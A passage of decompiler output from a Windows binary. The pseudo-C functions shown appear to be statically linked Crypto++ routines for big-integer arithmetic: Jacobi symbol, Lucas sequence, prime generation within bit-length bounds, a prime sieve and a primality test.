        if ( v48 < v49 )
          v21 = v48;
        Block = v50;
        v40 = v50;
        LOBYTE(v51) = 20;
        memset(v50, 0, 4 * v21);
        if ( v21 )
          j_j_unknown_libname_61(v40);
        else
          j_j___free_base(v40);
        LOBYTE(v51) = 11;
        if ( !sub_440F30(v60, (int)v56) )
          break;
        sub_43D500(v42, 1u);
        LOBYTE(v51) = 24;
        v70 = sub_440F30(v60, (int)v42) == 0;
        v22 = v44;
        if ( v43 < v44 )
          v22 = v43;
        Block = v45;
        v41 = v45;
        LOBYTE(v51) = 25;
        memset(v45, 0, 4 * v22);
        if ( v22 )
          j_j_unknown_libname_61(v41);
        else
          j_j___free_base(v41);
        LOBYTE(v51) = 11;
        if ( v70 )
        {
          v25 = v62;
          v26 = v63;
          if ( v61 < v62 )
            v25 = v61;
          LOBYTE(v51) = 26;
          memset(v63, 0, 4 * v25);
          if ( v25 )
            j_j_unknown_libname_61(v26);
          else
            j_j___free_base(v26);
          v27 = v54;
          v28 = v55;
          if ( v53 < v54 )
            v27 = v53;
          LOBYTE(v51) = 27;
          memset(v55, 0, 4 * v27);
          if ( v27 )
            j_j_unknown_libname_61(v28);
          else
            j_j___free_base(v28);
          v51 = 28;
          goto LABEL_85;
        }
        if ( ++v68 >= i )
          goto LABEL_70;
      }
      v31 = v62;
      v32 = v63;
      if ( v61 < v62 )
        v31 = v61;
      LOBYTE(v51) = 21;
      memset(v63, 0, 4 * v31);
      if ( v31 )
        j_j_unknown_libname_61(v32);
      else
        j_j___free_base(v32);
      v33 = v54;
      v34 = v55;
      if ( v53 < v54 )
        v33 = v53;
      LOBYTE(v51) = 22;
      memset(v55, 0, 4 * v33);
      if ( v33 )
        j_j_unknown_libname_61(v34);
      else
        j_j___free_base(v34);
      v51 = 23;
      goto LABEL_46;
    }
LABEL_70:
    v23 = v62;
    v24 = v63;
    if ( v61 < v62 )
      v23 = v61;
    LOBYTE(v51) = 29;
    memset(v63, 0, 4 * v23);
    if ( v23 )
      j_j_unknown_libname_61(v24);
    else
      j_j___free_base(v24);
    v35 = v54;
    v36 = v55;
    if ( v53 < v54 )
      v35 = v53;
    LOBYTE(v51) = 30;
    memset(v55, 0, 4 * v35);
    if ( v35 )
      j_j_unknown_libname_61(v36);
    else
      j_j___free_base(v36);
    v51 = 31;
LABEL_85:
    v29 = v58;
    v30 = v59;
    if ( v57 < v58 )
      v29 = v57;
    memset(v59, 0, 4 * v29);
    if ( v29 )
      j_j_unknown_libname_61(v30);
    else
      j_j___free_base(v30);
    return 0;
  }
  v14 = v62;
  v15 = v63;
  if ( v61 < v62 )
    v14 = v61;
  LOBYTE(v51) = 14;
  memset(v63, 0, 4 * v14);
  if ( v14 )
    j_j_unknown_libname_61(v15);
  else
    j_j___free_base(v15);
  v16 = v54;
  v17 = v55;
  if ( v53 < v54 )
    v16 = v53;
  LOBYTE(v51) = 15;
  memset(v55, 0, 4 * v16);
  if ( v16 )
    j_j_unknown_libname_61(v17);
  else
    j_j___free_base(v17);
  v51 = 16;
LABEL_46:
  v18 = v58;
  v19 = v59;
  if ( v57 < v58 )
    v18 = v57;
  memset(v59, 0, 4 * v18);
  if ( v18 )
    j_j_unknown_libname_61(v19);
  else
    j_j___free_base(v19);
  return 1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4645F0: using guessed type _DWORD var_24[2];
// 4645F0: using guessed type _DWORD var_90[2];
// 4645F0: using guessed type _DWORD var_A8[6];
// 4645F0: using guessed type _DWORD var_54[2];
// 4645F0: using guessed type _DWORD var_6C[2];
// 4645F0: using guessed type _DWORD var_3C[2];
// 4645F0: using guessed type _DWORD var_C0[2];

//----- (00464C40) --------------------------------------------------------
int __cdecl sub_464C40(_DWORD *a1, _DWORD *a2)
{
  int i; // esi
  unsigned int j; // ebx
  _DWORD *v4; // eax
  unsigned int v5; // edx
  void *v6; // ebx
  int v7; // ebx
  unsigned int v8; // edx
  void *v9; // esi
  unsigned int v10; // edx
  void *v11; // esi
  unsigned int v12; // edx
  void *v13; // esi
  _DWORD v15[2]; // [esp+10h] [ebp-54h] BYREF
  unsigned int v16; // [esp+18h] [ebp-4Ch]
  unsigned int v17; // [esp+1Ch] [ebp-48h]
  void *Block; // [esp+20h] [ebp-44h]
  _DWORD v19[2]; // [esp+28h] [ebp-3Ch] BYREF
  unsigned int v20; // [esp+30h] [ebp-34h]
  unsigned int v21; // [esp+34h] [ebp-30h]
  void *v22; // [esp+38h] [ebp-2Ch]
  _DWORD v23[2]; // [esp+40h] [ebp-24h] BYREF
  unsigned int v24; // [esp+48h] [ebp-1Ch]
  unsigned int v25; // [esp+4Ch] [ebp-18h]
  void *v26; // [esp+50h] [ebp-14h]
  int v27; // [esp+60h] [ebp-4h]

  sub_43D420(v19, a2);
  v27 = 0;
  sub_4432F0(a1, v23, a2);
  LOBYTE(v27) = 1;
  for ( i = 1; !sub_43DCE0(v23); LOBYTE(v27) = 1 )
  {
    for ( j = 0; !sub_4428B0(v23, j); ++j )
      ;
    sub_43E500(v23, j);
    if ( (j & 1) != 0 && (sub_4433F0(v19, 8u) == 3 || sub_4433F0(v19, 8u) == 5) )
      i = -i;
    if ( sub_4433F0(v23, 4u) == 3 && sub_4433F0(v19, 4u) == 3 )
      i = -i;
    sub_44E830(v23, v19);
    v4 = sub_4432F0(v23, v15, v19);
    LOBYTE(v27) = 2;
    sub_43DBB0(v23, v4);
    v5 = v17;
    v6 = Block;
    if ( v16 < v17 )
      v5 = v16;
    LOBYTE(v27) = 3;
    memset(Block, 0, 4 * v5);
    if ( v5 )
      j_j_unknown_libname_61(v6);
    else
      j_j___free_base(v6);
  }
  sub_43D500(v15, 1u);
  LOBYTE(v27) = 4;
  v7 = 0;
  if ( !sub_440F30(v19, (int)v15) )
    v7 = i;
  v8 = v17;
  v9 = Block;
  if ( v16 < v17 )
    v8 = v16;
  LOBYTE(v27) = 5;
  memset(Block, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v10 = v25;
  v11 = v26;
  if ( v24 < v25 )
    v10 = v24;
  LOBYTE(v27) = 6;
  memset(v26, 0, 4 * v10);
  if ( v10 )
    j_j_unknown_libname_61(v11);
  else
    j_j___free_base(v11);
  v12 = v21;
  v13 = v22;
  if ( v20 < v21 )
    v12 = v20;
  v27 = 7;
  memset(v22, 0, 4 * v12);
  if ( v12 )
    j_j_unknown_libname_61(v13);
  else
    j_j___free_base(v13);
  return v7;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 464C40: using guessed type _DWORD var_3C[2];
// 464C40: using guessed type _DWORD var_24[2];
// 464C40: using guessed type _DWORD var_54[2];

//----- (00464E40) --------------------------------------------------------
_DWORD *__cdecl sub_464E40(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  unsigned int v4; // ebx
  int *v5; // eax
  unsigned int v7; // edx
  void *v8; // esi
  int *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  unsigned int v12; // ebx
  _DWORD *v13; // esi
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  _DWORD *v18; // eax
  unsigned int v19; // edx
  void *v20; // esi
  unsigned int v21; // edx
  void *v22; // esi
  unsigned int v23; // edx
  void *v24; // esi
  unsigned int v25; // edx
  void *v26; // esi
  _DWORD v27[31]; // [esp+10h] [ebp-B8h] BYREF
  _DWORD v28[2]; // [esp+8Ch] [ebp-3Ch] BYREF
  unsigned int v29; // [esp+94h] [ebp-34h]
  unsigned int v30; // [esp+98h] [ebp-30h]
  void *Block; // [esp+9Ch] [ebp-2Ch]
  _DWORD v32[2]; // [esp+A4h] [ebp-24h] BYREF
  unsigned int v33; // [esp+ACh] [ebp-1Ch]
  unsigned int v34; // [esp+B0h] [ebp-18h]
  void *v35; // [esp+B4h] [ebp-14h]
  int v36; // [esp+C4h] [ebp-4h]
  _DWORD v37[2]; // [esp+C8h] [ebp+0h] BYREF
  unsigned int v38; // [esp+D0h] [ebp+8h]
  unsigned int v39; // [esp+D4h] [ebp+Ch]
  void *v40; // [esp+D8h] [ebp+10h]
  _DWORD v41[2]; // [esp+E0h] [ebp+18h] BYREF
  unsigned int v42; // [esp+E8h] [ebp+20h]
  unsigned int v43; // [esp+ECh] [ebp+24h]
  void *v44; // [esp+F0h] [ebp+28h]
  _DWORD v45[2]; // [esp+F8h] [ebp+30h] BYREF
  unsigned int v46; // [esp+100h] [ebp+38h]
  unsigned int v47; // [esp+104h] [ebp+3Ch]
  void *v48; // [esp+108h] [ebp+40h]
  int v49; // [esp+110h] [ebp+48h]
  _DWORD *v50; // [esp+114h] [ebp+4Ch]
  _DWORD *v51; // [esp+118h] [ebp+50h]

  v49 = 0;
  v4 = sub_440BD0(a2);
  if ( v4 )
  {
    sub_43D720(v27, a4);
    v36 = 1;
    sub_4432F0(a3, v28, a4);
    v49 = 2;
    LOBYTE(v36) = 2;
    sub_43B010(v27, v37, v28);
    v7 = v30;
    v8 = Block;
    if ( v29 < v30 )
      v7 = v29;
    LOBYTE(v36) = 5;
    memset(Block, 0, 4 * v7);
    if ( v7 )
      j_j_unknown_libname_61(v8);
    else
      j_j___free_base(v8);
    LOBYTE(v36) = 4;
    v9 = sub_44E4D0();
    sub_43B010(v27, v32, v9);
    LOBYTE(v36) = 6;
    sub_43D420(v45, v37);
    LOBYTE(v36) = 7;
    v10 = sub_44DE20(v27, (int)v37);
    v11 = sub_44E340(v27, (int)v10, (int)v32);
    sub_43D420(v41, v11);
    LOBYTE(v36) = 8;
    v12 = v4 - 1;
    while ( v12 )
    {
      if ( sub_4428B0(a2, --v12) )
      {
        v13 = v41;
        v50 = v41;
        v14 = v45;
      }
      else
      {
        v13 = v45;
        v50 = v45;
        v14 = v41;
      }
      v51 = v14;
      v15 = sub_443930(v27, (int)v45, (int)v41);
      v16 = sub_44E340(v27, (int)v15, (int)v37);
      sub_43DBB0(v51, v16);
      v17 = sub_44DE20(v27, (int)v50);
      v18 = sub_44E340(v27, (int)v17, (int)v32);
      sub_43DBB0(v13, v18);
    }
    sub_440F70(v27, a1, (int)v45);
    v49 = 3;
    v19 = v43;
    v20 = v44;
    if ( v42 < v43 )
      v19 = v42;
    LOBYTE(v36) = 9;
    memset(v44, 0, 4 * v19);
    if ( v19 )
      j_j_unknown_libname_61(v20);
    else
      j_j___free_base(v20);
    v21 = v47;
    v22 = v48;
    if ( v46 < v47 )
      v21 = v46;
    LOBYTE(v36) = 10;
    memset(v48, 0, 4 * v21);
    if ( v21 )
      j_j_unknown_libname_61(v22);
    else
      j_j___free_base(v22);
    v23 = v34;
    v24 = v35;
    if ( v33 < v34 )
      v23 = v33;
    LOBYTE(v36) = 11;
    memset(v35, 0, 4 * v23);
    if ( v23 )
      j_j_unknown_libname_61(v24);
    else
      j_j___free_base(v24);
    v25 = v39;
    v26 = v40;
    if ( v38 < v39 )
      v25 = v38;
    LOBYTE(v36) = 12;
    memset(v40, 0, 4 * v25);
    if ( v25 )
      j_j_unknown_libname_61(v26);
    else
      j_j___free_base(v26);
    sub_439FE0((int)v27);
    return a1;
  }
  else
  {
    v5 = sub_44E4D0();
    sub_43D420(a1, v5);
    return a1;
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 464E40: using guessed type _DWORD var_10C[31];
// 464E40: using guessed type _DWORD var_90[2];
// 464E40: using guessed type _DWORD var_54[2];
// 464E40: using guessed type _DWORD var_78[2];
// 464E40: using guessed type _DWORD var_24[2];
// 464E40: using guessed type _DWORD var_3C[2];

//----- (004650E0) --------------------------------------------------------
_DWORD *__cdecl sub_4650E0(_DWORD *a1, unsigned int a2)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // ebx
  _DWORD *v9; // eax
  int v10; // esi
  int v11; // eax
  void (__thiscall ***v12)(_DWORD, int); // ecx
  void (__thiscall ***v13)(_DWORD, int); // ecx
  int v14; // edi
  _DWORD *v15; // esi
  int v16; // eax
  int v17; // eax
  _DWORD *v18; // ebx
  unsigned int v19; // edx
  void *v20; // esi
  unsigned int v21; // edx
  void *v22; // esi
  _DWORD v24[2]; // [esp+14h] [ebp-3Ch] BYREF
  unsigned int v25; // [esp+1Ch] [ebp-34h]
  unsigned int v26; // [esp+20h] [ebp-30h]
  void *v27; // [esp+24h] [ebp-2Ch]
  _DWORD v28[2]; // [esp+2Ch] [ebp-24h] BYREF
  unsigned int v29; // [esp+34h] [ebp-1Ch]
  unsigned int v30; // [esp+38h] [ebp-18h]
  void *Block; // [esp+3Ch] [ebp-14h]
  int v32; // [esp+4Ch] [ebp-4h]
  _DWORD v33[3]; // [esp+50h] [ebp+0h] BYREF
  void **v34; // [esp+5Ch] [ebp+Ch] BYREF
  void (__thiscall ***v35)(_DWORD, int); // [esp+60h] [ebp+10h]
  _DWORD *v36; // [esp+68h] [ebp+18h]
  int v37; // [esp+6Ch] [ebp+1Ch]
  _DWORD *v38; // [esp+70h] [ebp+20h]
  unsigned int v39; // [esp+74h] [ebp+24h]
  char pExceptionObject[16]; // [esp+78h] [ebp+28h] BYREF
  _DWORD v41[6]; // [esp+88h] [ebp+38h] BYREF
  _DWORD v42[3]; // [esp+A0h] [ebp+50h] BYREF
  void **v43; // [esp+ACh] [ebp+5Ch] BYREF
  void (__thiscall ***v44)(_DWORD, int); // [esp+B0h] [ebp+60h]

  v2 = 0;
  v36 = a1;
  v39 = 0;
  if ( a2 < 0x10 )
  {
    sub_419B80((int)v42, "invalid bit length");
    v32 = 1;
    sub_405230(pExceptionObject, v42);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_43D6C0(v24);
  v32 = 2;
  sub_43D6C0(v28);
  LOBYTE(v32) = 3;
  if ( (a2 & 1) != 0 )
  {
    v6 = (_DWORD *)sub_4443D0((int)v41, (a2 - 1) >> 1);
    LOBYTE(v32) = 9;
    sub_43DBB0(v24, v6);
    LOBYTE(v32) = 3;
    sub_4066A0((int)v41);
    sub_43D500(v42, 0xB5u);
    LOBYTE(v32) = 10;
    v7 = sub_463090(v41, ((a2 + 1) >> 1) - 8);
    LOBYTE(v32) = 11;
    sub_43DBB0(v28, v7);
    sub_4066A0((int)v41);
    v5 = v42;
  }
  else
  {
    sub_43D500(v33, 0xB6u);
    LOBYTE(v32) = 4;
    v3 = sub_463090(v42, (a2 >> 1) - 8);
    LOBYTE(v32) = 5;
    sub_43DBB0(v24, v3);
    sub_4066A0((int)v42);
    LOBYTE(v32) = 3;
    sub_4066A0((int)v33);
    sub_43D500(v33, 1u);
    LOBYTE(v32) = 6;
    v4 = (_DWORD *)sub_4443D0((int)v41, a2 >> 1);
    LOBYTE(v32) = 7;
    sub_4431A0(v4, v42, (int)v33);
    v2 = 2;
    v39 = 2;
    LOBYTE(v32) = 8;
    sub_43DBB0(v28, v42);
    sub_4066A0((int)v42);
    sub_4066A0((int)v41);
    v5 = v33;
  }
  sub_4066A0((int)v5);
  LOBYTE(v32) = 12;
  v8 = sub_4550C0(&v34);
  LOBYTE(v32) = 13;
  v9 = operator new(0x14u);
  v10 = (int)v9;
  v38 = v9;
  if ( v9 )
  {
    v9[1] = "RandomNumberType";
    *((_WORD *)v9 + 4) = 1;
    v9[3] = 0;
    *v9 = &CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::Integer::RandomNumberType>::`vftable';
    v9[4] = 1;
  }
  else
  {
    v10 = 0;
  }
  v38 = (_DWORD *)v10;
  v11 = v8[1];
  v8[1] = 0;
  v12 = *(void (__thiscall ****)(_DWORD, int))(v10 + 12);
  LOBYTE(v32) = 14;
  v37 = v11;
  if ( v12 )
  {
    (**v12)(v12, 1);
    v11 = v37;
  }
  *(_DWORD *)(v10 + 12) = v11;
  v13 = (void (__thiscall ***)(_DWORD, int))v8[1];
  v38 = 0;
  if ( v13 )
    (**v13)(v13, 1);
  v8[1] = v10;
  *((_BYTE *)v8 + 8) = 1;
  LOBYTE(v32) = 13;
  v14 = v2 | 4;
  v15 = sub_455040(&v43, (int)v8);
  v39 = v14;
  LOBYTE(v32) = 16;
  if ( v35 )
    (**v35)(v35, 1);
  LOBYTE(v32) = 12;
  v34 = &CryptoPP::NameValuePairs::`vftable';
  v16 = sub_462C50((int)v15, (int)"Min", v24);
  v17 = sub_462C50(v16, (int)"Max", v28);
  v18 = v36;
  sub_455040(v36, v17);
  v39 = v14 & 0xFFFFFFFA | 1;
  LOBYTE(v32) = 17;
  if ( v44 )
    (**v44)(v44, 1);
  v43 = &CryptoPP::NameValuePairs::`vftable';
  v19 = v30;
  v20 = Block;
  if ( v29 < v30 )
    v19 = v29;
  LOBYTE(v32) = 18;
  memset(Block, 0, 4 * v19);
  if ( v19 )
    j_j_unknown_libname_61(v20);
  else
    j_j___free_base(v20);
  v21 = v26;
  v22 = v27;
  if ( v25 < v26 )
    v21 = v25;
  v32 = 19;
  memset(v27, 0, 4 * v21);
  if ( v21 )
    j_j_unknown_libname_61(v22);
  else
    j_j___free_base(v22);
  return v18;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BAFB0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::Integer::RandomNumberType>::`vftable';
// 4650E0: using guessed type _DWORD var_A8[2];
// 4650E0: using guessed type _DWORD var_90[2];
// 4650E0: using guessed type _DWORD var_6C[3];
// 4650E0: using guessed type _DWORD var_1C[3];
// 4650E0: using guessed type _DWORD var_34[6];

//----- (00465410) --------------------------------------------------------
_DWORD *__cdecl sub_465410(_DWORD *a1, _DWORD *a2, int a3, int a4, _DWORD *a5, _DWORD *a6, _DWORD *a7)
{
  unsigned int v7; // edx
  void *v8; // esi
  unsigned int v9; // edx
  void *v10; // esi
  unsigned int v11; // edx
  void *v12; // esi
  unsigned int v13; // edx
  void *v14; // esi
  unsigned int v15; // edx
  void *v16; // esi
  unsigned int v17; // edx
  void *v18; // esi
  _DWORD v20[2]; // [esp+10h] [ebp-70h] BYREF
  unsigned int v21; // [esp+18h] [ebp-68h]
  unsigned int v22; // [esp+1Ch] [ebp-64h]
  void *v23; // [esp+20h] [ebp-60h]
  _DWORD v24[2]; // [esp+28h] [ebp-58h] BYREF
  unsigned int v25; // [esp+30h] [ebp-50h]
  unsigned int v26; // [esp+34h] [ebp-4Ch]
  void *Block; // [esp+38h] [ebp-48h]
  _DWORD v28[2]; // [esp+40h] [ebp-40h] BYREF
  unsigned int v29; // [esp+48h] [ebp-38h]
  unsigned int v30; // [esp+4Ch] [ebp-34h]
  void *v31; // [esp+50h] [ebp-30h]
  _DWORD v32[2]; // [esp+58h] [ebp-28h] BYREF
  unsigned int v33; // [esp+60h] [ebp-20h]
  unsigned int v34; // [esp+64h] [ebp-1Ch]
  void *v35; // [esp+68h] [ebp-18h]
  int v36; // [esp+70h] [ebp-10h]
  int v37; // [esp+7Ch] [ebp-4h]

  v36 = 0;
  sub_43D6C0(v28);
  v37 = 1;
  sub_43D6C0(v32);
  LOBYTE(v37) = 2;
  sub_4432F0(a2, v20, a5);
  v36 = 2;
  LOBYTE(v37) = 3;
  sub_44E580(v24, (int)v20, a3, a5);
  v36 = 6;
  LOBYTE(v37) = 4;
  sub_43DBB0(v28, v24);
  v7 = v26;
  v8 = Block;
  if ( v25 < v26 )
    v7 = v25;
  LOBYTE(v37) = 5;
  memset(Block, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  v9 = v22;
  v10 = v23;
  if ( v21 < v22 )
    v9 = v21;
  LOBYTE(v37) = 6;
  memset(v23, 0, 4 * v9);
  if ( v9 )
    j_j_unknown_libname_61(v10);
  else
    j_j___free_base(v10);
  LOBYTE(v37) = 2;
  sub_4432F0(a2, v24, a6);
  v36 = 14;
  LOBYTE(v37) = 7;
  sub_44E580(v20, (int)v24, a4, a6);
  v36 = 30;
  LOBYTE(v37) = 8;
  sub_43DBB0(v32, v20);
  v11 = v22;
  v12 = v23;
  if ( v21 < v22 )
    v11 = v21;
  LOBYTE(v37) = 9;
  memset(v23, 0, 4 * v11);
  if ( v11 )
    j_j_unknown_libname_61(v12);
  else
    j_j___free_base(v12);
  v13 = v26;
  v14 = Block;
  if ( v25 < v26 )
    v13 = v25;
  LOBYTE(v37) = 10;
  memset(Block, 0, 4 * v13);
  if ( v13 )
    j_j_unknown_libname_61(v14);
  else
    j_j___free_base(v14);
  LOBYTE(v37) = 2;
  sub_463210(a1, (int)v28, a5, v32, a6, a7);
  v36 = 31;
  v15 = v34;
  v16 = v35;
  if ( v33 < v34 )
    v15 = v33;
  LOBYTE(v37) = 11;
  memset(v35, 0, 4 * v15);
  if ( v15 )
    j_j_unknown_libname_61(v16);
  else
    j_j___free_base(v16);
  v17 = v30;
  v18 = v31;
  if ( v29 < v30 )
    v17 = v29;
  v37 = 12;
  memset(v31, 0, 4 * v17);
  if ( v17 )
    j_j_unknown_libname_61(v18);
  else
    j_j___free_base(v18);
  return a1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 465410: using guessed type _DWORD var_40[2];
// 465410: using guessed type _DWORD var_28[2];
// 465410: using guessed type _DWORD var_70[2];
// 465410: using guessed type _DWORD var_58[2];

//----- (00465640) --------------------------------------------------------
char __thiscall sub_465640(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  int v4; // edx
  _DWORD *v5; // ebx
  int v6; // ecx
  int v7; // edi
  _DWORD *v8; // edx
  unsigned int v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // edx
  void *v12; // ebx
  unsigned int v13; // edx
  void *v14; // ebx
  char result; // al
  unsigned int v16; // edx
  void *v17; // ebx
  unsigned int v18; // edx
  void *v19; // ebx
  unsigned int v20; // edx
  void *v21; // ebx
  _DWORD v22[2]; // [esp+10h] [ebp-84h] BYREF
  unsigned int v23; // [esp+18h] [ebp-7Ch]
  unsigned int v24; // [esp+1Ch] [ebp-78h]
  void *v25; // [esp+20h] [ebp-74h]
  _DWORD v26[2]; // [esp+28h] [ebp-6Ch] BYREF
  unsigned int v27; // [esp+30h] [ebp-64h]
  unsigned int v28; // [esp+34h] [ebp-60h]
  void *v29; // [esp+38h] [ebp-5Ch]
  _DWORD v30[2]; // [esp+40h] [ebp-54h] BYREF
  unsigned int v31; // [esp+48h] [ebp-4Ch]
  unsigned int v32; // [esp+4Ch] [ebp-48h]
  void *v33; // [esp+50h] [ebp-44h]
  _DWORD v34[2]; // [esp+58h] [ebp-3Ch] BYREF
  unsigned int v35; // [esp+60h] [ebp-34h]
  unsigned int v36; // [esp+64h] [ebp-30h]
  void *v37; // [esp+68h] [ebp-2Ch]
  _DWORD v38[2]; // [esp+70h] [ebp-24h] BYREF
  unsigned int v39; // [esp+78h] [ebp-1Ch]
  unsigned int v40; // [esp+7Ch] [ebp-18h]
  void *Block; // [esp+80h] [ebp-14h]
  int v42; // [esp+90h] [ebp-4h]

  v3 = this[23];
  v4 = this[20];
  if ( v3 >= 0 )
    v5 = (_DWORD *)(v4 + 4 * ((unsigned int)v3 >> 5));
  else
    v5 = (_DWORD *)(v4 - (4 * ((unsigned int)~v3 >> 5) + 4));
  v6 = this[19];
  v7 = v3 & 0x1F;
  if ( v6 >= 0 )
    v8 = (_DWORD *)(v4 + 4 * ((unsigned int)v6 >> 5));
  else
    v8 = (_DWORD *)(v4 - (4 * ((unsigned int)~v6 >> 5) + 4));
  v9 = v6 & 0x1F;
  while ( (v8 != v5 || v9 != v7) && ((1 << v9) & *v8) != 0 )
  {
    if ( v9 >= 0x1F )
    {
      v9 = 0;
      ++v8;
    }
    else
    {
      ++v9;
    }
  }
  v10 = v9 + 32 * (((int)v8 - this[20]) >> 2);
  this[19] = v10;
  if ( v10 == this[23] )
  {
    sub_43D500(v34, this[23]);
    v42 = 0;
    sub_44E440(v34, v38, (int)(this + 12));
    LOBYTE(v42) = 1;
    sub_43E3C0((int)this, (int)v38);
    v11 = v40;
    v12 = Block;
    if ( v39 < v40 )
      v11 = v39;
    LOBYTE(v42) = 2;
    memset(Block, 0, 4 * v11);
    if ( v11 )
      j_j_unknown_libname_61(v12);
    else
      j_j___free_base(v12);
    v13 = v36;
    v14 = v37;
    if ( v35 < v36 )
      v13 = v35;
    v42 = 3;
    memset(v37, 0, 4 * v13);
    if ( v13 )
      j_j_unknown_libname_61(v14);
    else
      j_j___free_base(v14);
    v42 = -1;
    if ( sub_440F30(this, (int)(this + 6)) <= 0 )
    {
      this[19] = 0;
      sub_463390(this);
      return sub_465640(a2);
    }
    else
    {
      return 0;
    }
  }
  else
  {
    sub_43D500(v22, v10);
    v42 = 4;
    sub_44E440(v22, v26, (int)(this + 12));
    LOBYTE(v42) = 5;
    sub_443C50(this, v30, (int)v26);
    LOBYTE(v42) = 6;
    sub_43DBB0(a2, v30);
    v16 = v32;
    v17 = v33;
    if ( v31 < v32 )
      v16 = v31;
    LOBYTE(v42) = 7;
    memset(v33, 0, 4 * v16);
    if ( v16 )
      j_j_unknown_libname_61(v17);
    else
      j_j___free_base(v17);
    v18 = v28;
    v19 = v29;
    if ( v27 < v28 )
      v18 = v27;
    LOBYTE(v42) = 8;
    memset(v29, 0, 4 * v18);
    if ( v18 )
      j_j_unknown_libname_61(v19);
    else
      j_j___free_base(v19);
    v20 = v24;
    v21 = v25;
    if ( v23 < v24 )
      v20 = v23;
    v42 = 9;
    memset(v25, 0, 4 * v20);
    if ( v20 )
      j_j_unknown_libname_61(v21);
    else
      j_j___free_base(v21);
    result = 1;
    ++this[19];
  }
  return result;
}
// 465678: conditional instruction was optimized away because edi.4<0
// 4656A4: conditional instruction was optimized away because ecx.4<0
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 465640: using guessed type _DWORD var_3C[2];
// 465640: using guessed type _DWORD var_24[2];
// 465640: using guessed type _DWORD var_84[2];
// 465640: using guessed type _DWORD var_6C[2];
// 465640: using guessed type _DWORD var_54[2];

//----- (004658D0) --------------------------------------------------------
unsigned int __cdecl sub_4658D0(_DWORD *a1)
{
  return sub_440BD0(a1);
}

//----- (004658E0) --------------------------------------------------------
char __cdecl sub_4658E0(int *a1, _DWORD *a2, unsigned int a3)
{
  _DWORD *v3; // esi
  unsigned int v4; // edx
  void *v5; // ebx
  char v6; // bl
  int v7; // eax
  int v9; // ebx
  unsigned int v10; // edx
  void *v11; // esi
  unsigned int v12; // edx
  void *v13; // esi
  unsigned int v14; // edx
  void *v15; // esi
  unsigned int v16; // edx
  void *v17; // esi
  unsigned int v18; // edx
  void *v19; // esi
  _DWORD v20[6]; // [esp+10h] [ebp-3Ch] BYREF
  _DWORD v21[2]; // [esp+28h] [ebp-24h] BYREF
  unsigned int v22; // [esp+30h] [ebp-1Ch]
  unsigned int v23; // [esp+34h] [ebp-18h]
  void *v24; // [esp+38h] [ebp-14h]
  int v25; // [esp+48h] [ebp-4h]
  _DWORD v26[2]; // [esp+4Ch] [ebp+0h] BYREF
  unsigned int v27; // [esp+54h] [ebp+8h]
  unsigned int v28; // [esp+58h] [ebp+Ch]
  void *v29; // [esp+5Ch] [ebp+10h]
  _DWORD v30[2]; // [esp+64h] [ebp+18h] BYREF
  unsigned int v31; // [esp+6Ch] [ebp+20h]
  unsigned int v32; // [esp+70h] [ebp+24h]
  void *v33; // [esp+74h] [ebp+28h]
  _DWORD v34[2]; // [esp+7Ch] [ebp+30h] BYREF
  unsigned int v35; // [esp+84h] [ebp+38h]
  unsigned int v36; // [esp+88h] [ebp+3Ch]
  void *Block; // [esp+8Ch] [ebp+40h]
  _DWORD v38[2]; // [esp+94h] [ebp+48h] BYREF
  unsigned int v39; // [esp+9Ch] [ebp+50h]
  unsigned int v40; // [esp+A0h] [ebp+54h]
  void *v41; // [esp+A4h] [ebp+58h]
  int v42; // [esp+ACh] [ebp+60h]
  int v43; // [esp+B0h] [ebp+64h]
  bool v44; // [esp+B7h] [ebp+6Bh]

  v42 = 0;
  v43 = 0;
  sub_43D500(v34, 3u);
  v3 = a2;
  v25 = 0;
  v44 = sub_440F30(a2, (int)v34) <= 0;
  v4 = v36;
  v5 = Block;
  if ( v35 < v36 )
    v4 = v35;
  v25 = 1;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v25 = -1;
  if ( v44 )
  {
    sub_43D500(v20, 2u);
    v25 = 2;
    v6 = 1;
    v43 = 1;
    if ( !sub_440F30(a2, (int)v20)
      || (sub_43D500(v34, 3u), v25 = 3, v6 = 3, v43 = 3, v7 = sub_440F30(a2, (int)v34), v44 = 0, !v7) )
    {
      v44 = 1;
    }
    if ( (v6 & 2) != 0 )
      sub_4066A0((int)v34);
    sub_4066A0((int)v20);
    return v44;
  }
  else
  {
    sub_43D6C0(v38);
    v9 = 0;
    v25 = 4;
    if ( a3 )
    {
      while ( 1 )
      {
        sub_43D500(v21, 2u);
        LOBYTE(v25) = 5;
        sub_43D500(v26, 2u);
        LOBYTE(v25) = 6;
        sub_4431A0(v3, v30, (int)v21);
        v42 |= 4u;
        LOBYTE(v25) = 7;
        sub_4444A0(v38, a1, v26, (int)v30);
        v10 = v32;
        v11 = v33;
        if ( v31 < v32 )
          v10 = v31;
        LOBYTE(v25) = 8;
        memset(v33, 0, 4 * v10);
        if ( v10 )
